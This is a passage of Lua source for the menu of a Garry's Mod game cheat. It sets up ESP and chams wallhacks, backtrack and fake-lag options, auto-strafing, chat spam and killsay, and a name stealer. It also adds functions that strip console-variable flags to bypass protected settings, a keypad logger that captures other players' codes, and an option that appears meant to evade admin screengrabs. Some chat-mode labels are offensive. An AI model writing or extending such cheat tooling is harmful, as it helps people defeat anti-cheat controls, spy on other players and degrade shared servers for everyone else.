    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Alt Rapid fire", "Alt Rapid fire" )
end

ultimate.spfuncs[4] = function()
    ultimate.ui.SettingsPan:SetSize( 250, 85 )

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Smooth amount", "Smoothing", 0, 1, 2 )
end

ultimate.spfuncs[11] = function()
    ultimate.ui.SettingsPan:SetSize(250,200)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Team color", "Box team color" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Gradient", "Box gradient" )
    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Style", "Box style", { "Default", "Corner", "Hex", "Poly", "3D" })


end

ultimate.spfuncs[12] = function()
    ultimate.ui.SettingsPan:SetSize(250,48)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Health bar", "Health bar" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Gradient", "Health bar gradient" )
end

ultimate.spfuncs[666] = function()
    ultimate.ui.SettingsPan:SetSize(250,48)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Armor bar", "Armor bar" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Gradient", "Armor bar gradient" )
end

ultimate.spfuncs[14] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Visible material", "Visible mat", ultimate.chamsMaterials)
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Weapon chams", "Visible chams w" )

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Invisible material", "inVisible mat", ultimate.chamsMaterials)
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "inVisible chams", "inVisible chams" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Weapon chams", "inVisible chams w" )

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Fullbright", "Supress lighting" )
end

ultimate.spfuncs[229] = function()
    ultimate.ui.SettingsPan:SetSize(250,360)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Brightness","Color Modify Brightness", 0, 3, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Contrast","Color Modify Contrast", 0, 5, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Saturation","Color Modify Saturation", 0, 5, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Add red","Color Modify Add Red", 0, 10, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Add green","Color Modify Add Green", 0, 10, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Add blue","Color Modify Add Blue", 0, 10, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Mul red","Color Modify Mul Red", 0, 255, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Mul green","Color Modify Mul Green", 0, 255, 4 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Mul blue","Color Modify Mul Blue", 0, 255, 4 )
end

ultimate.spfuncs[15] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Material", "Self mat", ultimate.chamsMaterials)
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Weapon chams", "Self chams w" )

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Fullbright", "Supress self lighting" )
end

ultimate.spfuncs[16] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Material", "Backtrack material", ultimate.chamsMaterials)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Fullbright", "Backtrack fullbright" )
end

ultimate.spfuncs[17] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Material", "Entity material", ultimate.chamsMaterials)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Fullbright", "Entity fullbright" )
end

ultimate.spfuncs[18] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Die time","Tracers die time",1,10,0 )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Bullet tracers muzzle", "Bullet tracers muzzle" )

end

ultimate.spfuncs[19] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Material", "Viewmodel chams type", ultimate.chamsMaterials)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Fullbright", "Fullbright viewmodel" )
end

ultimate.spfuncs[20] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Smoothing", "Third person smoothing" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Collision", "Third person collision" )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Distance","Third person distance",50,220,0 )
end

ultimate.spfuncs[21] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Freecam speed","Free camera speed",5,100,0 )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Ghetto mode", "Ghetto free cam" )
end

ultimate.spfuncs[233] = function()
    ultimate.ui.SettingsPan:SetSize(250,126)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Viewmodel X","Viewmodel x",-50,50,1 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Viewmodel Y","Viewmodel y",-50,50,1 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Viewmodel Z","Viewmodel z",-50,50,1 )

end

ultimate.spfuncs[31] = function()
    ultimate.ui.SettingsPan:SetSize(250,48)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Style", "Ent box style", { "Default", "Corner", "3D" })
end


ultimate.spfuncs[35] = function( p )
    local mdl = vgui.Create( "DModelPanel", p )
    mdl:SetPos(85,125)
    mdl:SetSize(85,125)
    mdl:SetModel( "models/props_vehicles/truck001a.mdl" )

    mdl:SetCamPos(Vector(0,0,148))

    function mdl:LayoutEntity( Entity ) return end

    for i = 1,4 do
        local poses = ultimate.esppansposes

        ultimate.esppans[i].panel = vgui.Create( "UPaintedPanel", p )
        ultimate.esppans[i].panel:SetPos(poses[i].x,poses[i].y)
        ultimate.esppans[i].panel:SetSize(85,125)
        ultimate.esppans[i].panel:Receiver( "SwagCock$", ultimate.DoDrop )
        ultimate.esppans[i].panel.pos = i
    end

    for i = 1, #ultimate.espelements do
        local cfgstr = ultimate.espelements[i]
        local panel = ultimate.esppans[ultimate.cfg.vars[cfgstr]].panel

        local b = vgui.Create("UESPPButton")
        b:SetText( cfgstr )
		b:SetSize( 36, 24 )
		b:Dock( TOP )
        b:Droppable( "SwagCock$" )

        b:SetParent( panel )
    end
end

ultimate.spfuncs[33] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Show ammo", "Show ammo" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Print name", "Weapon printname" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Show reloading", "Show reloading" )

end

ultimate.spfuncs[34] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)


end

function ultimate.tabs.Visuals()

    local p = ultimate.itemPanel("Player",1,425):GetItemPanel()

    ultimate.ui.CheckBox( p, "Box", "Box esp", false, false, true, ultimate.spfuncs[11] )

    ultimate.ui.CheckBox( p, "Name", "Name", false, false, false, false, false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Name pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )
    ultimate.ui.CheckBox( p, "Usergroup", "Usergroup", false, false, false, false, false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Usergroup pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )
    ultimate.ui.CheckBox( p, "Health", "Health", false, false, true, ultimate.spfuncs[12], false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Health pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(3,0,0,0) ultimate.ui.ColorPicker( "Health bar gradient", p ) end )
    ultimate.ui.CheckBox( p, "Armor", "Armor", false, false, true, ultimate.spfuncs[666], false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Armor pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(3,0,0,0) ultimate.ui.ColorPicker( "Armor bar gradient", p ) end )
    ultimate.ui.CheckBox( p, "Weapon", "Weapon", false, false, false, ultimate.spfuncs[33], false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Weapon pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(3,0,0,0) end )
    ultimate.ui.CheckBox( p, "Team", "Team", false, false, false, false, false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Team pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )
    ultimate.ui.CheckBox( p, "Money", "DarkRP Money", false, false, false, false, false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Money pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )
    ultimate.ui.CheckBox( p, "Lag compensation", "Break LC", false, false, false, false, false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Break LC pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )
    ultimate.ui.CheckBox( p, "Packets ( Fake lag )", "Simtime updated", false, false, false, false, false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "Simtime pos", {"Up","Down","Right","Left"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )
    ultimate.ui.CheckBox( p, "Show records", "Show records" )
    ultimate.ui.CheckBox( p, "Skeleton", "Skeleton" )
    ultimate.ui.CheckBox( p, "Sight lines", "Sight lines" )
    ultimate.ui.CheckBox( p, "OOF Arrows", "OOF Arrows", false, false, false, false, false, function(p)
        local lbl, drop = ultimate.ui.ComboBox( p, "", "OOF Style", {"Arrow","UkroSwastika"} )
        lbl:Remove()
        drop:Dock(RIGHT)
        drop:DockMargin(0,0,0,0)
    end )
    // ultimate.ui.CheckBox( p, "OOF Arrows", "OOF Arrows", false, false, false, ultimate.spfuncs[34], false, function(p) local lbl, drop = ultimate.ui.ComboBox( p, "", "OOF Style", {"Arrow","UkroSwastika"} ) lbl:Remove() drop:Dock(RIGHT) drop:DockMargin(0,0,0,0) end )

    ultimate.ui.Slider( p, "Max distance","ESP Distance", 0, 20000,0 )

    ultimate.ui.Label( p, "Add player key", function( p ) ultimate.ui.Binder( "Player add", p ) end )

    local p = ultimate.itemPanel("Entity",1,135):GetItemPanel()

    ultimate.ui.CheckBox( p, "Box", "Ent box", false, false, false, ultimate.spfuncs[31] )
    ultimate.ui.CheckBox( p, "Class", "Ent class" )
    ultimate.ui.Slider( p, "Max distance","Ent ESP Distance",0, 20000,0 )
    ultimate.ui.Label( p, "Add entity key", function( p ) ultimate.ui.Binder( "Ent add", p ) end )

    local p = ultimate.itemPanel("Colored models",2,150):GetItemPanel()

    ultimate.ui.CheckBox( p, "Player chams", "Visible chams", false, false, true, ultimate.spfuncs[14], false, function(p) ultimate.ui.ColorPicker( "inVisible chams", p ) end )
    ultimate.ui.CheckBox( p, "Self chams", "Self chams", false, false, true, ultimate.spfuncs[15] )
    ultimate.ui.CheckBox( p, "Backtrack chams", "Backtrack chams", false, false, true, ultimate.spfuncs[16] )
    ultimate.ui.CheckBox( p, "Entity chams", "Entity chams", false, false, true, ultimate.spfuncs[17], false )
    ultimate.ui.CheckBox( p, "Viewmodel chams", "Viewmodel chams", false, false, true, ultimate.spfuncs[19], false )

    local p = ultimate.itemPanel("Outlines",2,115):GetItemPanel()

    ultimate.ui.CheckBox( p, "Player outline", "Player outline", false, false, true )
    ultimate.ui.CheckBox( p, "Entity outline", "Entity outline", false, false, true )
    ultimate.ui.ComboBox( p, "Style", "Outline style", { "Default", "Subtractive", "Additive" } )

    local p = ultimate.itemPanel( "Indicators", 2, 165 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Hitmarker", "Hitmarker", false, false, true )
    ultimate.ui.CheckBox( p, "Hitnumbers", "Hitnumbers", false, false, true, false, false, function(p) ultimate.ui.ColorPicker( "Hitnumbers krit", p ) end )
    //ultimate.ui.CheckBox( p, "Hit particles", "Hit particles", false, false, true, ultimate.spfuncs[31] )
    ultimate.ui.CheckBox( p, "On screen logs", "On screen logs", false, false, true, false, false, function(p) ultimate.ui.ColorPicker( "Miss lagcomp", p ) ultimate.ui.ColorPicker( "Miss spread", p ) ultimate.ui.ColorPicker( "Miss fail", p ) end )
    ultimate.ui.CheckBox( p, "Spectator list", "Spectator list", false, false, false, ultimate.spfuncs[913] )
    ultimate.ui.CheckBox( p, "Tickbase", "Tickbase indicator" )
    ultimate.ui.CheckBox( p, "Indicators", "Indicators")

    local p = ultimate.itemPanel( "Misc", 2, 220 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Hide name", "Hide name" )
    ultimate.ui.TextEntry( "Custom name", "Custom name", p, 999 )
    ultimate.ui.CheckBox( p, "Disable sensivity adjustment", "Disable sensivity adjustment" )
    ultimate.ui.CheckBox( p, "Screengrab image", "Screengrab image" )
    ultimate.ui.ComboBox( p, "ESP Font", "ESP Font", { "Outlined", "Shadow" } )
    --ultimate.ui.CheckBox( p, "Crosshair", "Crosshair", false, false, false, false, false, function( p ) ultimate.ui.ColorPicker( "Crosshair color", p ) end ) --krivo

    local p = ultimate.itemPanel("World",3,420):GetItemPanel()

    ultimate.ui.TextEntry( "Skybox texture", "Custom sky", p, 420 )
    ultimate.ui.CheckBox( p, "Sky color", "Sky color", false, false, true )
    ultimate.ui.CheckBox( p, "Wall color", "Wall color", false, false, true )

    ultimate.ui.CheckBox( p, "Fullbright", "Fullbright", false, true )
    ultimate.ui.ComboBox( p, "Mode", "Fullbright mode", { "Default", "Corvus extreme" } )
    ultimate.ui.CheckBox( p, "Disable shadows", "Disable shadows" )

    ultimate.ui.CheckBox( p, "Fog changer", "FogChanger", false, false, true )
    ultimate.ui.Slider( p, "Fog start","FogStart", 1, 4200, 0 )
    ultimate.ui.Slider( p, "Fog end","FogEnd", 1, 9000, 0 )

    ultimate.ui.CheckBox( p, "Color modify", "Color Modify", false, false, false, ultimate.spfuncs[229] )

    ultimate.ui.CheckBox( p, "Bullet tracers", "Bullet tracers", false, false, true, ultimate.spfuncs[18] )
    ultimate.ui.TextEntry( "Material", "Bullet tracers material", p, 420 )


    local p = ultimate.itemPanel("View",3,145):GetItemPanel()

    ultimate.ui.CheckBox( p, "Override view", "Override view" )

    ultimate.ui.CheckBox( p, "Third person", "Third person", false, true, false, ultimate.spfuncs[20] )
    ultimate.ui.CheckBox( p, "Free camera", "Free camera", false, true, false, ultimate.spfuncs[21] )
    ultimate.ui.Slider( p, "Aspect ratio","Aspect ratio",0,2,3,function(val) RunConsoleCommand("r_aspectratio",val) end )

    local p = ultimate.itemPanel("ViewModel", 3, 160):GetItemPanel()

    ultimate.ui.CheckBox( p, "Viewmodel Manip", "Viewmodel Manip", false, false, false, ultimate.spfuncs[233] )
    ultimate.ui.CheckBox( p, "Viewmodel changer", "Viewmodel changer" )
    ultimate.ui.Slider( p, "Override","Fov override",75,160,0 )
    ultimate.ui.Slider( p, "Fov","Viewmodel fov",50,180,0 )
























    /*





    ultimate.checkbox("Kill sound","Killsound",p:GetItemPanel())


    local p = ultimate.itemPanel("World",2,123)



    local p = ultimate.itemPanel("Effects",2,142)





    local p = ultimate.itemPanel("View",3,275)




    // ultimate.ESPPP:Show()
*/
end

ultimate.spfuncs[25] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Strafe mode", "Strafe mode", {"Legit","Rage","Multidir"})
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Ground strafer", "Ground strafer" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Sin ( snake ) strafe", "Z Hop", false, true )
end

ultimate.spfuncs[26] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Predict ticks", "CStrafe ticks", 16, 128, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Angle step", "CStrafe angle step", 1, 10, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Angle max step", "CStrafe angle max step", 5, 50, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Ground diff", "CStrafe ground diff", 1, 65, 0 )
end

ultimate.spfuncs[37] = function()
    ultimate.ui.SettingsPan:SetSize(250,256)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Show path", "Adaptive CStrafe Path", false, false, true )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Predict ticks", "CStrafe ticks", 16, 128, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Angle step", "CStrafe angle step", 1, 10, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Angle max step", "CStrafe angle max step", 5, 50, 0 )
end

ultimate.spfuncs[27] = function( p )
    ultimate.ui.TextEntry( "Name", "Name Convar", p, 250 )
    ultimate.ui.Button( "Change name", function() jopa.NetSetConVar("name",ultimate.cfg.vars["Name Convar"]) end, p )
    ultimate.ui.CheckBox( p, "Name stealer", "Name stealer" )

    ultimate.ui.TextEntry( "Disconnect reason", "Disconnect reason", p, 250 )
    ultimate.ui.Button( "Disconnect", function() jopa.NetDisconnect(ultimate.cfg.vars["Disconnect reason"]) end, p )
end

function ultimate.CustomCvarVal( net )
    local m = net == 1 and "Net Convar mode" or "Cvar mode"
    local n = net == 1 and "Net Convar int" or "Cvar int"
    local s = net == 1 and "Net Convar str" or "Cvar str"

    local mode = ultimate.cfg.vars[m]
    local num = ultimate.cfg.vars[n]
    local set = mode == 2 and math.Round( num ) or num

    if mode == 1 then set = ultimate.cfg.vars[s] end

    return set
end

ultimate.spfuncs[28] = function( p )
    ultimate.ui.TextEntry( "Cvar name", "Net Convar", p, 250 )
    ultimate.ui.Slider( p, "Cvar int", "Net Convar int", 1, 100, 2 )
    ultimate.ui.TextEntry( "Cvar str", "Net Convar str", p, 250 )

    ultimate.ui.ComboBox( p, "Set mode", "Net Convar mode", {"String","Int","Float"})

    ultimate.ui.Button( "Send new val", function() jopa.NetSetConVar( ultimate.cfg.vars["Net Convar"] ,ultimate.CustomCvarVal( 1 ) ) end, p )
end

ultimate.FCVAR = {
    str = {
        "Archive", "Archive XBOX", "Cheat", "Client can execute", "Client DLL", "Demo", "Dont record",
        "Game DLL", "Lua client", "Lua server", "Never as string", "None", "Notify", "Not connected",
        "Printable only", "Protected", "Replicated", "Server cannot query", "Server can execute",
        "Sponly", "Unlogged", "Unregistered", "Userinfo"
    },
    int = {
        128, 16777216, 16384, 1073741824, 8, 65536, 131072, 4, 262144, 524288, 4096, 0, 256, 4194304,
        1024, 32, 8192, 536870912, 268435456, 64, 2048, 1, 512
    }
}

ultimate.spfuncs[29] = function( p )
    ultimate.ui.TextEntry( "Enter cvar name", "Cvar name", p, 500 )
    ultimate.ui.Slider( p, "Custom number", "Cvar int", 1, 1000, 2 )
    ultimate.ui.TextEntry( "Custom string", "Cvar str", p, 500 )

    ultimate.ui.ComboBox( p, "Cvar mode", "Cvar mode", {"String","Int","Float"})

    ultimate.ui.Button( "Change cvar", function()
        local s = ultimate.CustomCvarVal( 0 )
        local n = ultimate.cfg.vars["Cvar name"]

        local flag = GetConVar(n):GetFlags()

        jopa.ConVarSetFlags( n, 0 )

        RunConsoleCommand( n, s )

        jopa.ConVarSetFlags( n, flag )
    end, p )

    ultimate.ui.ComboBox( p, "Cvar flag", "Cvar flag", ultimate.FCVAR.str)

    ultimate.ui.Button( "Change flag", function()
        jopa.ConVarSetFlags( ultimate.cfg.vars["Cvar name"], ultimate.FCVAR.int[ ultimate.cfg.vars["Cvar flag"] ] )
        print( ultimate.cfg.vars["Cvar name"], ultimate.FCVAR.int[ ultimate.cfg.vars["Cvar flag"] ] )
    end, p )

end

function ultimate.tabs.Misc()

    local function func( p )
        ultimate.ui.MTButton( p, "Cvar", ultimate.spfuncs[29] )
        ultimate.ui.MTButton( p, "Net cvar", ultimate.spfuncs[28] )
        ultimate.ui.MTButton( p, "Net", ultimate.spfuncs[27] )
    end

    local p = ultimate.itemPanel("Movement",1,255):GetItemPanel()

    ultimate.ui.CheckBox( p, "Bunny hop", "Bhop" )
    ultimate.ui.CheckBox( p, "Air strafer", "Air strafer", false, false, false, ultimate.spfuncs[25] )
    ultimate.ui.CheckBox( p, "Circle strafe", "Circle strafe", false, true, false, ultimate.spfuncs[26] )
    ultimate.ui.CheckBox( p, "Adaptive CStrafe", "Adaptive CStrafe", false, true, false, ultimate.spfuncs[37] )
    ultimate.ui.CheckBox( p, "Keep sprint", "Sprint" )
    ultimate.ui.CheckBox( p, "Fast stop", "Fast stop" )
    ultimate.ui.CheckBox( p, "Auto peak", "Auto peak", false, true )
    ultimate.ui.CheckBox( p, "Auto teleport back", "Auto peak tp" )
    ultimate.ui.CheckBox( p, "Water walk", "Water jump" )
    ultimate.ui.CheckBox( p, "Remove keys", "Remove keys" )

    local p = ultimate.itemPanel("Key spam",1,185):GetItemPanel()

    ultimate.ui.CheckBox( p, "Use spam", "Use spam" )
    ultimate.ui.CheckBox( p, "Flashlight spam", "Flashlight spam" )
    ultimate.ui.CheckBox( p, "Auto GTA", "Auto GTA" )
    ultimate.ui.CheckBox( p, "Camera spam", "Camera spam" )
    ultimate.ui.CheckBox( p, "Vape spam", "Vape spam" )
    ultimate.ui.CheckBox( p, "Retry on handcuff", "Retry on handcuff" )

    local p = ultimate.itemPanel( "Sounds", 2, 173 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Hitsound", "Hitsound" )
    ultimate.ui.TextEntry( "Sound path", "Hitsound str", p, 420 )
    ultimate.ui.CheckBox( p, "Killsound", "Killsound" )
    ultimate.ui.TextEntry( "Sound path", "Killsound str", p, 420 )

    local p = ultimate.itemPanel("Chat",2,282):GetItemPanel()

    ultimate.ui.CheckBox( p, "Spammer", "Chat spammer" )
    ultimate.ui.ComboBox( p, "Mode", "Chat mode", { "Sacred quotes", "Domestic terrorist", "SAMOWARE", "Навальный", "ChitDaunovV1", "ChitDaunovV2" })
    ultimate.ui.ComboBox( p, "Group", "Chat group", { "Default", "OOC", "Advert", "PM", "ULX" })
    ultimate.ui.Slider( p, "Delay", "Chat delay", 0,20,0 )

    ultimate.ui.CheckBox( p, "Killsay", "Killsay" )
    ultimate.ui.ComboBox( p, "Mode", "Killsay mode", { "Sacred quotes", "Domestic terrorist", "SAMOWARE", "Навальный", "ChitDaunovV1", "ChitDaunovV2" })
    ultimate.ui.ComboBox( p, "Group", "Killsay group", { "Default", "OOC", "Advert", "PM", "ULX" })

    ultimate.itemPanelB( "Net / Cvar", 3, 310, func )

    local p = ultimate.itemPanel("Memes",3,165):GetItemPanel()

    ultimate.ui.CheckBox( p, "Follow Player", "Ghost follower" )
    ultimate.ui.TextEntry( "Steam ID", "GFID", p, 500 )
    ultimate.ui.CheckBox( p, "Auto Затяг ( Vape )", "Auto Vape" )
    ultimate.ui.CheckBox( p, "Fast lockpick", "Fast lockpick" )
    ultimate.ui.CheckBox( p, "Keypad Logger", "Keypad Logger" )

   /*
        ultimate.checkbox("Safe hop","Safe hop",p:GetItemPanel())
        ultimate.checkbox("Edge jump","Edge jump",p:GetItemPanel())
        ultimate.checkbox("Air duck","Air duck",p:GetItemPanel())
    */
end

/*
function ultimate.updateMenuColor( col )
    local r, g, b = col.r, col.g, col.b

    for i = 1,255 do
        ultimate.Colors[i] = Color( i + r, i + g, i + b, 255 )
    end
end
*/


function ultimate.tabs.Config()
    local p = ultimate.itemPanel("Settings",1,230):GetItemPanel()

    ultimate.ui.ComboBox( p, "Choice", "Selected config", ultimate.cfgTable)

    ultimate.ui.Button( "Load", function() ultimate.LoadConfig() end, p )
    ultimate.ui.Button( "Save", function() ultimate.SaveConfig() end, p )
    ultimate.ui.Button( "Delete", function() ultimate.DeleteConfig() end, p )

    ultimate.ui.TextEntry( "Name", "Config name", p, 64 )
    ultimate.ui.Button( "Create", function() ultimate.CreateConfig() end, p )

    //ultimate.ui.Label( p, "Menu color", function( p ) ultimate.ui.ColorPicker( "Menu color", p, ultimate.updateMenuColor ) end )
end

function ultimate.tabs.Players()
    local playerlist = player.GetAll()


    for i = 1, #playerlist do
        local pEntity = playerlist[i]
        local pButton = vgui.Create("Panel", ultimate.scrollpanel)
        pButton:SetTall(25)
        pButton:Dock(TOP)

        function pButton:Paint(w, h)
            if not IsValid(pEntity) then self:Remove() return end
            local steamId = pEntity:SteamID()
            
            local isPriority = ultimate.cfg.priorityList and ultimate.cfg.priorityList[steamId]
            local isFriend = ultimate.cfg.friends and ultimate.cfg.friends[steamId]
            
            if isPriority then
                surface.SetDrawColor(50, 0, 0, 100) 
                surface.DrawRect(0, 0, w, h)
            end
            
            surface.SetFont("DermaSmall")
            
            local nameColor = Color(255, 255, 255) 
            if isPriority then
                nameColor = Color(255, 50, 50) 
            elseif isFriend then
                nameColor = Color(0, 255, 0) 
            end

            local nameStartX = 10

            surface.SetTextColor(nameColor.r, nameColor.g, nameColor.b)
            surface.SetTextPos(nameStartX, 5)
            surface.DrawText(pEntity:Name())
            
            local nameWidth = surface.GetTextSize(pEntity:Name())
            local indicatorX = nameStartX + nameWidth + 5

            if isPriority then
                surface.SetTextColor(255, 100, 0)
                surface.SetTextPos(indicatorX, 5)
                surface.DrawText("[Piority]")
                indicatorX = indicatorX + surface.GetTextSize("[Piority]") + 3
            end

            if isFriend then
                surface.SetTextColor(0, 255, 0)
                surface.SetTextPos(indicatorX, 5)
                surface.DrawText("[Friend]")
            end
            
            local teamIndex, teamName, teamColor = ultimate.GetTeam(pEntity)
            local textWidth, textHeight = surface.GetTextSize(teamName)
            surface.SetTextColor(teamColor)
            surface.SetTextPos(w / 2 - textWidth / 2, 5)
            surface.DrawText(teamName)
            
            local userGroup = ultimate.GetUserGroup(pEntity)
            local textWidth, textHeight = surface.GetTextSize(userGroup)
            surface.SetTextColor(255, 255, 255)
            surface.SetTextPos(w - textWidth - 5, 5)
            surface.DrawText(userGroup)
            
            surface.SetDrawColor(45, 45, 45)
            surface.DrawRect(0, h - 1, w, 1)
        end

        function pButton:OnMousePressed(mouseCode)
            if not IsValid(pEntity) then self:Remove() return end

            local steamId = pEntity:SteamID()

            if mouseCode == MOUSE_LEFT then
                ultimate.cfg.friends[steamId] = not ultimate.cfg.friends[steamId]
            elseif mouseCode == MOUSE_RIGHT then
                ultimate.cfg.priorityList[steamId] = not ultimate.cfg.priorityList[steamId]
            end
        end
    end
end

function ultimate.tabs.Entities()
    if ultimate.entitySearchPanel then ultimate.entitySearchPanel:Remove() end
    if ultimate.entityButtons then
        for _, btn in ipairs(ultimate.entityButtons) do
            if IsValid(btn) then btn:Remove() end
        end
    end
    ultimate.entityButtons = {}

    local searchPanel = vgui.Create("Panel", ultimate.scrollpanel)
    searchPanel:SetTall(30)
    searchPanel:Dock(TOP)
    ultimate.entitySearchPanel = searchPanel

    local searchBox = vgui.Create("DTextEntry", searchPanel)
    searchBox:Dock(FILL)
    searchBox:DockMargin(5, 5, 5, 5)
    searchBox:SetUpdateOnType(true)
    searchBox:SetPlaceholderText("Поиск по классу...")

    searchBox:SetTextColor(Color(0, 0, 0))
    searchBox:SetHighlightColor(Color(0, 0, 0))
    searchBox:SetCursorColor(Color(0, 0, 0))

    local function RefreshEntityList()
        for _, btn in ipairs(ultimate.entityButtons) do
            if IsValid(btn) then btn:Remove() end
        end
        ultimate.entityButtons = {}

        local entitylist = ents.GetAll()
        local classes = {}
        local search = string.lower(searchBox:GetValue() or "")

        for i = 1, #entitylist do
            local pEntity = entitylist[i]
            if not IsValid(pEntity) then continue end

            local class = pEntity:GetClass()
            if class == "player" then continue end

            if not classes[class] then
                classes[class] = pEntity
            end
        end

        local sortedClasses = {}
        for class, ent in pairs(classes) do
            table.insert(sortedClasses, {class = class, ent = ent})
        end
        table.SortByMember(sortedClasses, "class", true)

        for _, data in ipairs(sortedClasses) do
            local class = data.class
            local pEntity = data.ent

            if search ~= "" and not string.find(string.lower(class), search, 1, true) then
                continue
            end

            local pButton = vgui.Create("Panel", ultimate.scrollpanel)
            pButton:SetTall(25)
            pButton:Dock(TOP)

            function pButton:Paint(w, h)
                if not IsValid(pEntity) then self:Remove() return end

                surface.SetFont("DermaSmall")

                if (ultimate.cfg.ents[class]) then
                    surface.SetTextColor(0, 255, 0)
                else
                    surface.SetTextColor(255, 255, 255)
                end

                surface.SetTextPos(10, 5)
                surface.DrawText(class)

                surface.SetDrawColor(45, 45, 45)
                surface.DrawRect(0, h - 1, w, 1)
            end

            function pButton:OnMousePressed(mouseCode)
                if not IsValid(pEntity) then self:Remove() return end

                if (mouseCode == MOUSE_LEFT) then
                    if not ultimate.cfg.ents[class] then
                        ultimate.cfg.ents[class] = true
                    else
                        ultimate.cfg.ents[class] = nil
                    end
                end
            end

            table.insert(ultimate.entityButtons, pButton)
        end
    end

    searchBox.OnValueChange = function()
        RefreshEntityList()
    end

    RefreshEntityList()
end




ultimate.ttable = {}

